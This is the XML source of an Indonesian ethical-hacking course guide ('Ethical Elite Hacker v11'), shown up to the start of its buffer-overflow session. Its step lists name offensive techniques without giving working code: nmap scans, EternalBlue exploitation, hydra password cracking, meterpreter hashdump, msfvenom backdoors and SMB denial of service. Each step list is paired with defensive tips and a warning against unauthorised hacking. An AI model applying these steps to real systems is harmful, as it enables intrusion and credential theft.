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 w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
          <w:color w:val="003366"/>
          <w:sz w:val="40"/>
        </w:rPr>
        <w:t>PANDUAN LENGKAP</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
          <w:color w:val="005096"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>Ethical Elite Hacker v11</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
          <w:color w:val="006432"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Dari NOL sampai MAHIR</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>24 Sesi | Bahasa Indonesia + Analogi</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>X-Code Training</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="003366"/>
        </w:rPr>
        <w:t>KATA PENGANTAR</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Panduan ini membantu belajar ethical hacking dari NOL sampai MAHIR, berdasarkan kurikulum Ethical Elite Hacker v11 dari X-Code Training.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Setiap teknik: analogi sederhana, step-by-step, cara pertahanan.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>PENTING: Materi untuk pembelajaran SAH. Jangan meretas tanpa izin!</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="003366"/>
        </w:rPr>
        <w:t>Sesi 1: Pengantar Cyber Security &amp; Networking</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:color w:val="505050"/>
        </w:rPr>
        <w:t>Dasar cyber security dan networking.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="006432"/>
        </w:rPr>
        <w:t xml:space="preserve">💡 Cyber Security: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>SATPAM GEDUNG. Firewall=jagain pintu.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="006432"/>
        </w:rPr>
        <w:t xml:space="preserve">💡 Red vs Blue: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>Red=nyerang. Blue=bertahan.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="006432"/>
        </w:rPr>
        <w:t xml:space="preserve">💡 Networking: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>IP=alamat rumah. Port=pintu.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Step-by-Step Praktek</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 1: </w:t>
      </w:r>
      <w:r>
        <w:t>Pahami 7 layer OSI</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 2: </w:t>
      </w:r>
      <w:r>
        <w:t>Belajar IP, subnet</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 3: </w:t>
      </w:r>
      <w:r>
        <w:t>Kenali protokol: HTTP, SSH, DNS</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 4: </w:t>
      </w:r>
      <w:r>
        <w:t>Cek IP: ip a / ipconfig</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 5: </w:t>
      </w:r>
      <w:r>
        <w:t>Cek port: nc -zv target 22 80</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Pertahanan &amp; Pengamanan</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Update sistem</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Gunakan firewall</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="003366"/>
        </w:rPr>
        <w:t>Sesi 2: Kriptografi &amp; TOR</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:color w:val="505050"/>
        </w:rPr>
        <w:t>Encoding, enkripsi, hash, TOR, SSH Tunnel.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="006432"/>
        </w:rPr>
        <w:t xml:space="preserve">💡 Encode vs Enkripsi: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>Encode=BAHASA SANDI. Enkripsi=KUNCI RAHASIA.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="006432"/>
        </w:rPr>
        <w:t xml:space="preserve">💡 Hash: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>SIDIK JARI digital.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="006432"/>
        </w:rPr>
        <w:t xml:space="preserve">💡 TOR: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>SURAT BERANTAI lewat banyak pos.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Step-by-Step Praktek</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 1: </w:t>
      </w:r>
      <w:r>
        <w:t>Base64 encode/decode</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 2: </w:t>
      </w:r>
      <w:r>
        <w:t>Hash file: md5sum, sha256sum</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 3: </w:t>
      </w:r>
      <w:r>
        <w:t>Crack MD5: hashcat</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 4: </w:t>
      </w:r>
      <w:r>
        <w:t>Coba TOR</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 5: </w:t>
      </w:r>
      <w:r>
        <w:t>SSH Tunnel</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Pertahanan &amp; Pengamanan</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Encoding != enkripsi</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Gunakan SHA256</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="003366"/>
        </w:rPr>
        <w:t>Sesi 3: VirtualBox, Docker &amp; Linux Dasar</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:color w:val="505050"/>
        </w:rPr>
        <w:t>Virtualisasi dan command line.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="006432"/>
        </w:rPr>
        <w:t xml:space="preserve">💡 Virtualisasi: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>RUMAH BONEKA di dalam rumah.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="006432"/>
        </w:rPr>
        <w:t xml:space="preserve">💡 Docker: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>KONTRAKAN INSTAN.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="006432"/>
        </w:rPr>
        <w:t xml:space="preserve">💡 Linux: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>ILMU SIHIR: ls, cd, rm.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Step-by-Step Praktek</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 1: </w:t>
      </w:r>
      <w:r>
        <w:t>Install VirtualBox, buat VM</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 2: </w:t>
      </w:r>
      <w:r>
        <w:t>Command: ls, cd, pwd, mkdir</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 3: </w:t>
      </w:r>
      <w:r>
        <w:t>Install Apache</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 4: </w:t>
      </w:r>
      <w:r>
        <w:t>Install Docker</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 5: </w:t>
      </w:r>
      <w:r>
        <w:t>Jalankan DVWA: docker run</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Pertahanan &amp; Pengamanan</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Jangan expose VM ke publik</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="003366"/>
        </w:rPr>
        <w:t>Sesi 4: Linux/BSD Server Setup</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:color w:val="505050"/>
        </w:rPr>
        <w:t>Instalasi server: Ubuntu, Apache, Nginx, MySQL, DNS.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="006432"/>
        </w:rPr>
        <w:t xml:space="preserve">💡 Linux vs BSD: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>Linux=Toyota. FreeBSD=BMW. OpenBSD=Tank.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Step-by-Step Praktek</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 1: </w:t>
      </w:r>
      <w:r>
        <w:t>Install Ubuntu Server</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 2: </w:t>
      </w:r>
      <w:r>
        <w:t>Install Apache, Nginx</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 3: </w:t>
      </w:r>
      <w:r>
        <w:t>Buat virtualhost</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 4: </w:t>
      </w:r>
      <w:r>
        <w:t>Install MySQL</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 5: </w:t>
      </w:r>
      <w:r>
        <w:t>Firewall: ufw</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Pertahanan &amp; Pengamanan</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Matikan service tidak perlu</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="003366"/>
        </w:rPr>
        <w:t>Sesi 5: Kali Linux &amp; Tools</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:color w:val="505050"/>
        </w:rPr>
        <w:t>Scanning, eksploitasi dasar, password grabbing.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="006432"/>
        </w:rPr>
        <w:t xml:space="preserve">💡 Kali: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>KOTAK ALAT TUKANG.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="006432"/>
        </w:rPr>
        <w:t xml:space="preserve">💡 Scanning: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>SATPAM keliling catat pintu terbuka.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Step-by-Step Praktek</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 1: </w:t>
      </w:r>
      <w:r>
        <w:t>nmap -sn scan jaringan</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 2: </w:t>
      </w:r>
      <w:r>
        <w:t>nmap -sV -sC target</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 3: </w:t>
      </w:r>
      <w:r>
        <w:t>searchsploit cari exploit</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 4: </w:t>
      </w:r>
      <w:r>
        <w:t>routersploit</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 5: </w:t>
      </w:r>
      <w:r>
        <w:t>Metasploit: use exploit/...</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Pertahanan &amp; Pengamanan</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Update Kali</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Jangan scan tanpa izin!</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="003366"/>
        </w:rPr>
        <w:t>Sesi 6: Network Hacking</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:color w:val="505050"/>
        </w:rPr>
        <w:t>EternalBlue, SMBGhost, FTP, MikroTik.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="006432"/>
        </w:rPr>
        <w:t xml:space="preserve">💡 SMB: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>LEMARI FILE BERSAMA.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="006432"/>
        </w:rPr>
        <w:t xml:space="preserve">💡 EternalBlue: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>PINTU DARURAT lupa dikunci.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="006432"/>
        </w:rPr>
        <w:t xml:space="preserve">💡 MikroTik: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>POS SATPAM kompleks.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Step-by-Step Praktek</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 1: </w:t>
      </w:r>
      <w:r>
        <w:t>nmap --script smb-vuln-ms17-010</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 2: </w:t>
      </w:r>
      <w:r>
        <w:t>Exploit EternalBlue</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 3: </w:t>
      </w:r>
      <w:r>
        <w:t>Crack FTP: hydra</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 4: </w:t>
      </w:r>
      <w:r>
        <w:t>Hack MikroTik WinBox</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 5: </w:t>
      </w:r>
      <w:r>
        <w:t>DoS SMB</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Pertahanan &amp; Pengamanan</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Matikan SMBv1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Update Windows</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="003366"/>
        </w:rPr>
        <w:t>Sesi 7: Nessus &amp; Metasploit</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:color w:val="505050"/>
        </w:rPr>
        <w:t>Vulnerability scanning dan eksploitasi.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="006432"/>
        </w:rPr>
        <w:t xml:space="preserve">💡 Nessus: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>DOKTER UMUM untuk komputer.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="006432"/>
        </w:rPr>
        <w:t xml:space="preserve">💡 Metasploit: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>BENGKEL LENGKAP.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Step-by-Step Praktek</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 1: </w:t>
      </w:r>
      <w:r>
        <w:t>Install Nessus, buat scan</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 2: </w:t>
      </w:r>
      <w:r>
        <w:t>Analisis hasil</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 3: </w:t>
      </w:r>
      <w:r>
        <w:t>Metasploit: use, set, run</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 4: </w:t>
      </w:r>
      <w:r>
        <w:t>Meterpreter: sysinfo, hashdump</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="004682"/>
        </w:rPr>
        <w:t xml:space="preserve">LANGKAH 5: </w:t>
      </w:r>
      <w:r>
        <w:t>msfvenom backdoor</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Pertahanan &amp; Pengamanan</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Update software</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Segmentasi jaringan</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="003366"/>
        </w:rPr>
        <w:t>Sesi 8: Buffer Overflow</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:color w:val="505050"/>
        </w:rPr>
        <w:t>Exploit development: fuzzing, EIP, shellcode.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="006432"/>
        </w:rPr>
        <w:t xml:space="preserve">💡 BOF: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>GELAS keisi air penuh tumpah.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="006432"/>
        </w:rPr>
        <w:t xml:space="preserve">💡 EIP: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>REMOTE TV perintah selanjutnya.</w:t>
      </w:r>
    </w:p>
    <w:p>
